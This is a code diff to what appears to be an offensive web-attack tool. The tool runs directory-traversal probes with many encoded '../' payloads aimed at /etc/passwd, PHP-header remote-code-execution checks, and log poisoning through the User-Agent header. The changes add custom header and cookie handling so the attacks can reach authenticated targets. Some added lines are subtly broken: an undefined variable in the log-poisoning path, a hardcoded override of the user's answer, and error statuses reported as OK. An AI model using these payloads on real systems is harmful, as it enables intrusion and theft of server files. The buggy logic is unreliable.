@@ -1,4 +1,5 @@
 import re
+import http
 import requests
 import urllib
 from UAList import fetchUA, fetchAgent
@@ -18,7 +19,7 @@ import base64
 
 class Payload:
 
-	def __init__(self, url, outfile, creds, initiate=True, poc=["%2Fetc%2Fpasswd", "%2Fetc%2Fpasswd%00"], override_poc=False, verbosity=1, proxies=False, crawler=False, attempt_shell=False, mode=0, force=False, batch=None, stealth=False):
+	def __init__(self, url, outfile, creds, headers, cookies, initiate=True, poc=["%2Fetc%2Fpasswd", "%2Fetc%2Fpasswd%00"], override_poc=False, verbosity=1, proxies=False, crawler=False, attempt_shell=False, mode=0, force=False, batch=None, stealth=False):
 		requests.packages.urllib3.disable_warnings() # Comment out to stop suppressing warnings.
 		self.url = url.strip()
 		self.verbosity = verbosity
@@ -27,6 +28,8 @@ class Payload:
 		self.creds = creds
 		self.batch = batch
 		self.stealth = stealth
+		self.headers = headers
+		self.cookies = cookies
 		self.linux_dirTraversal = ["%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E", "%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E", "%2E%2E%2E%2E%2F%2F%2E%2E%2E%2E%2F%2F%2E%2E%2E%2E%2F%2F%2E%2E%2E%2E%2F%2F%2E%2E%2E%2E%2F%2F%2E%2E%2E%2E%2F%2F%2E%2E%2E%2E%2F", "%2F%2F%2E%2E%2E%2E%2F%2F%2E%2E%2E%2E%2F%2F%2E%2E%2E%2E%2F%2F%2E%2E%2E%2E%2F%2F%2E%2E%2E%2E%2F%2F%2E%2E%2E%2E%2F%2F%2E%2E%2E%2E%2F", "%2E%2E%2F%2E%2F%2E%2E%2F%2E%2F%2E%2E%2F%2E%2F%2E%2E%2F%2E%2F%2E%2E%2F%2E%2F%2E%2E", "%2F%2E%2E%2F%2E%2F%2E%2E%2F%2E%2F%2E%2E%2F%2E%2F%2E%2E%2F%2E%2F%2E%2E%2F%2E%2F%2E%2E", "%25%32%65%25%32%65%25%32%66%25%32%65%25%32%65%25%32%66%25%32%65%25%32%65%25%32%66%25%32%65%25%32%65%25%32%66%25%32%65%25%32%65%25%32%66%25%32%65%25%32%65%25%32%66%25%32%65%25%32%65%25%32%66", "&#46;&#46;&#47;&#46;&#46;&#47;&#46;&#46;&#47;&#46;&#46;&#47;&#46;&#46;&#47;&#46;&#46;&#47;&#46;&#46;&#47;&#46;&#46;&#47;&#46;&#46;&#47;", "\56\56\57\56\56\57\56\56\57\56\56\57\56\56\57\56\56\57\56\56\57\56\56\57\56\56\57\56\56\57\56\56\57"]
 		# poc -> Proof Of Concept (Change it if you want)
 		self.poc = poc
@@ -157,8 +160,22 @@ class Payload:
 			opener = urllib.request.build_opener(proxy_support)
 			urllib.request.install_opener(opener)
 		try:
+			# Ensure headers and cookies are dictionaries, not strings
+			if self.headers is not None:
+				if isinstance(self.headers, str):  # If headers is a string
+					self.headers = self.string_to_dict(self.headers)  # Convert to dict
+			if self.cookies is not None:
+				if isinstance(self.cookies, str):  # If cookies is a string
+					self.cookies = self.string_to_dict(self.cookies)  # Convert to dict
+
 			if self.creds is not None:
 				response = self.cred(url)
+			elif self.headers is not None and self.cookies is not None:
+				response = requests.get(url, headers=self.headers, cookies=self.cookies, verify=False)
+			elif self.headers is not None:
+				response = requests.get(url, headers=self.headers, verify=False)
+			elif self.cookies is not None:
+				response = requests.get(url, cookies=self.cookies, verify=False)
 			else:
 				response = requests.get(url, verify=False)
 			response = str(response.text)
@@ -173,33 +190,63 @@ class Payload:
 
 
 
-	# Checks if the url is valid
+	def string_to_dict(self, header_or_cookie_string):
+		if header_or_cookie_string is None:
+			return
+
+		# Split the string into individual key-value pairs, then split each pair by the first ':' for headers or '=' for cookies
+		result = {}
+		items = header_or_cookie_string.split(';') if '=' in header_or_cookie_string else header_or_cookie_string.split('\n')
+		
+		for item in items:
+			item = item.strip()
+			if ':' in item:  # For headers (e.g., 'Key: Value')
+				key, value = item.split(":", 1)
+				result[key.strip()] = value.strip()
+			elif '=' in item:  # For cookies (e.g., 'cookie_name=cookie_value')
+				key, value = item.split("=", 1)
+				result[key.strip()] = value.strip()
+		return result
+
+
 	def urlCheck(self):
 		# Extract the domain with protocol from the provided url
 		self.domain = urllib.parse.urlparse(self.url).scheme + '://' + urllib.parse.urlparse(self.url).netloc
+		
+		# Convert headers and cookies from string to dictionary if they're in string format
+		headers = self.headers if isinstance(self.headers, dict) else self.string_to_dict(self.headers) if hasattr(self, 'headers') else fetchUA()
+		cookies = self.cookies if isinstance(self.cookies, dict) else self.string_to_dict(self.cookies) if hasattr(self, 'cookies') else None
+
 		try:
 			print("Checking Remote Server Health")
 			if self.proxies:
-				ret = requests.get(self.domain, headers=fetchUA(), proxies=fetch_proxy(), verify=False)
+				# Include the headers and cookies in the request
+				ret = requests.get(self.domain, headers=headers, cookies=cookies, proxies=fetch_proxy(), verify=False)
 			elif self.creds is not None:
 				ret = self.cred(self.url)
 			else:
-				ret = requests.get(self.domain, headers=fetchUA(), verify=False)
-			if ret.status_code == 200:
-				print(colored(str(ret.status_code) +" - OK",'green'))
+				# Include the headers and cookies in the request
+				ret = requests.get(self.domain, headers=headers, cookies=cookies, verify=False)
+			if ret.status_code == 200 or ret.status_code == 400 or ret.status_code == 403 or ret.status_code == 500:
+				print(colored(str(ret.status_code) + " - OK", 'green'))
 				return True
 			else:
 				print(colored(str(ret.status_code) + " - DEAD", 'red'))
-				return False	
+				return False
+
 		except requests.exceptions.ConnectionError as e:
 			print(colored('[-] Endpoint DEAD', 'red'))
 			print(colored('[-] Failed with error: ', 'red') + str(e))
 			return False
 		except Exception as e:
+			# Catching generic exceptions
 			print(colored(str(ret.status_code) + " - DEAD", 'red'))
 			print(colored('[-]', 'red', attrs=['bold']) + ' Something went wrong, ', e)
 			print(colored('[!]', 'yellow', attrs=['bold']) + ' The URL format must be http://[URL]?[something]=')
 			return False
+
+
+
 
 
 
@@ -243,6 +290,8 @@ class Payload:
 
 	# Checks for Remote Code Execution with php headers
 	def headerCheck(self):
+		if self.phpHeaders is None:
+			return
 		rce = []
 		for header in self.phpHeaders:
 			compUrl = self.url + header
@@ -325,7 +374,10 @@ class Payload:
 
 	def logPoisonCheck(self):
 		headers = {"User-Agent": self.payload}
-		response = requests.get(self.url, headers=headers, verify=False)
+		if self.cookies is not None:
+			response = requests.get(self.domain, headers=headers, cookies=cookies, verify=False)
+		else:
+			response = requests.get(self.url, headers=headers, verify=False)
 		if self.verbosity > 1:
 			print(colored('[*]', 'yellow', attrs=['bold']) + ' Testing: Log Poisoning based on server type.')
 
@@ -345,6 +397,7 @@ class Payload:
 						ans = True
 					else:
 						ans = False
+					ans = True
 				if ans == True:
 					# Attempt to hit apache files first
 					ret = self.hitApache()	
